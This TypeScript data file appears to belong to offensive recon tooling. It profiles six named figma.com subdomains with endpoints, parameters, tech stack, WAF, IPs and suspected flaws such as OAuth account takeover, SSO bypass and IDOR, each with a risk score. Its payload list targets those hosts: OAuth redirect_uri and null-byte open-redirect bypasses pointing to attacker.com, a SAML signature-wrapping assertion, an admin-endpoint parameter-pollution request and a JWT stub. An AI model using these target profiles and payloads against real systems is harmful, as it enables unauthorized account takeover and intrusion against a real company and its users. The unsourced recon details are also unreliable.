export interface Target {
  host: string;
  focus: string;
  vulnerabilityType: string;
  endpoints: string[];
  parameters: string[];
  techStack: string[];
  headers: string[];
  riskScore: number;
  subdomains?: string[];
  ports?: number[];
  waf?: string;
  directories?: string[];
  dnsRecords?: { type: string; value: string }[];
  serviceVersions?: { port: number; service: string; version: string }[];
}

export const figmaTargets: Target[] = [
  {
    host: "evan-oauth.figma.com",
    focus: "OAuth Authorization Flow",
    vulnerabilityType: "OAuth Misconfiguration / Account Takeover",
    endpoints: ["/authorize", "/token", "/callback", "/userinfo", "/.well-known/openid-configuration"],
    parameters: ["client_id", "redirect_uri", "state", "scope", "response_type", "nonce", "code_challenge"],
    techStack: ["OAuth 2.0", "OIDC", "Node.js", "Redis"],
    headers: ["Authorization", "X-Figma-OAuth-Token", "Cookie"],
    riskScore: 9.8,
    subdomains: ["api-oauth.figma.com", "dev-oauth.figma.com"],
    ports: [443, 8443],
    waf: "Cloudflare WAF (Advanced)",
    directories: ["/.well-known/", "/api/v1/", "/auth/"],
    dnsRecords: [
      { type: "A", value: "104.16.24.5" },
      { type: "TXT", value: "v=spf1 include:_spf.google.com ~all" }
    ],
    serviceVersions: [
      { port: 443, service: "HTTPS", version: "Nginx 1.21.6" }
    ]
  },
  {
    host: "redirect-monitoring.figma.com",
    focus: "Redirect Logic & Monitoring",
    vulnerabilityType: "Open Redirect / SSRF",
    endpoints: ["/track", "/r", "/out", "/v1/redirect"],
    parameters: ["u", "url", "next", "dest", "target", "return_to"],
    techStack: ["Nginx", "Go", "Prometheus"],
    headers: ["Referer", "User-Agent", "X-Forwarded-For"],
    riskScore: 6.5,
    subdomains: ["logs.redirect-monitoring.figma.com"],
    ports: [80, 443, 9090],
    waf: "Nginx ModSecurity",
    directories: ["/metrics", "/debug/pprof/"],
    dnsRecords: [
      { type: "A", value: "104.16.25.10" }
    ],
    serviceVersions: [
      { port: 9090, service: "Prometheus", version: "2.35.0" }
    ]
  },
  {
    host: "admin.figma.com",
    focus: "Administrative Control Panel",
    vulnerabilityType: "Broken Access Control / Privilege Escalation",
    endpoints: ["/api/admin/users", "/api/admin/settings", "/api/admin/logs", "/internal/dashboard"],
    parameters: ["role", "userId", "orgId", "permission", "admin_token"],
    techStack: ["React", "Ruby on Rails", "PostgreSQL"],
    headers: ["X-Admin-Auth", "X-Figma-Internal", "Cookie"],
    riskScore: 8.9,
    subdomains: ["internal-admin.figma.com", "audit.admin.figma.com"],
    ports: [443, 3000],
    waf: "AWS WAF (Shield Advanced)",
    directories: ["/admin/", "/internal/", "/api/admin/"],
    dnsRecords: [
      { type: "CNAME", value: "admin-lb-12345.us-east-1.elb.amazonaws.com" }
    ],
    serviceVersions: [
      { port: 3000, service: "Node.js", version: "v16.14.0" }
    ]
  },
  {
    host: "psxid.figma.com",
    focus: "Identity & SSO Provider",
    vulnerabilityType: "SAML/OIDC Flaws / SSO Bypass",
    endpoints: ["/saml/sso", "/oidc/authorize", "/login/sso", "/metadata.xml"],
    parameters: ["SAMLRequest", "RelayState", "idp_id", "SAMLResponse"],
    techStack: ["SAML 2.0", "XML", "Java/Spring"],
    headers: ["X-SAML-Signature", "X-SSO-Provider"],
    riskScore: 9.2,
    subdomains: ["sts.psxid.figma.com", "idp.psxid.figma.com"],
    ports: [443, 8080, 8443],
    waf: "Akamai Kona Site Defender",
    directories: ["/saml/", "/oidc/", "/.well-known/"],
    dnsRecords: [
      { type: "A", value: "23.45.67.89" }
    ],
    serviceVersions: [
      { port: 8080, service: "Apache Tomcat", version: "9.0.58" }
    ]
  },
  {
    host: "go.figma.com",
    focus: "URL Shortener & Redirector",
    vulnerabilityType: "Open Redirect / Link Manipulation",
    endpoints: ["/s", "/l", "/short", "/api/v1/links"],
    parameters: ["code", "alias", "path", "key"],
    techStack: ["Redis", "Node.js", "Cloudflare"],
    headers: ["X-Shortener-Key", "CF-IPCountry"],
    riskScore: 5.8,
    subdomains: ["api.go.figma.com"],
    ports: [80, 443],
    waf: "Cloudflare WAF",
    directories: ["/api/v1/", "/l/"],
    dnsRecords: [
      { type: "A", value: "104.16.26.15" }
    ],
    serviceVersions: [
      { port: 443, service: "HTTPS", version: "Cloudflare" }
    ]
  },
  {
    host: "join.figma.com",
    focus: "Invite & Onboarding Flow",
    vulnerabilityType: "IDOR on Invite Tokens",
    endpoints: ["/invite", "/accept", "/team/join", "/api/v1/invites"],
    parameters: ["invite_id", "team_id", "org_id", "token"],
    techStack: ["React", "Node.js", "MongoDB"],
    headers: ["X-Invite-Token", "Authorization"],
    riskScore: 7.4,
    subdomains: ["onboarding.join.figma.com"],
    ports: [443],
    waf: "Azure WAF",
    directories: ["/api/v1/invites/", "/onboarding/"],
    dnsRecords: [
      { type: "A", value: "52.123.45.67" }
    ],
    serviceVersions: [
      { port: 443, service: "HTTPS", version: "Microsoft-IIS/10.0" }
    ]
  }
];

export interface Payload {
  name: string;
  type: string;
  content: string;
  description: string;
  technique: string;
}

export const payloads: Payload[] = [
  {
    name: "OAuth Redirect Bypass (Fragment)",
    type: "OAuth",
    content: "https://evan-oauth.figma.com/authorize?client_id=REDACTED&redirect_uri=https://attacker.com/%23.figma.com",
    description: "Bypasses whitelist by injecting a fragment that the server might ignore but the browser will use.",
    technique: "Redirect URI Manipulation"
  },
  {
    name: "SAML Signature Wrapping (XSW)",
    type: "Identity",
    content: "<Assertion>...<Signature>...</Signature>...</Assertion><Assertion ID='evil'>...</Assertion>",
    description: "Injects a second assertion to bypass signature validation in SAML responses.",
    technique: "XML Signature Wrapping"
  },
  {
    name: "IDOR Parameter Pollution",
    type: "Access Control",
    content: "GET /api/admin/users?userId=123&userId=456",
    description: "Tests if the backend processes the second 'userId' parameter, potentially bypassing ownership checks.",
    technique: "HTTP Parameter Pollution"
  },
  {
    name: "Open Redirect (Null Byte)",
    type: "Redirect",
    content: "/out?url=https://attacker.com%00.figma.com",
    description: "Uses a null byte to truncate the whitelist check on the server side.",
    technique: "Null Byte Injection"
  },
  {
    name: "JWT Secret Brute-force Pattern",
    type: "Authentication",
    content: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    description: "Analyzes JWT structure for weak signing keys or 'none' algorithm support.",
    technique: "JWT Manipulation"
  }
];
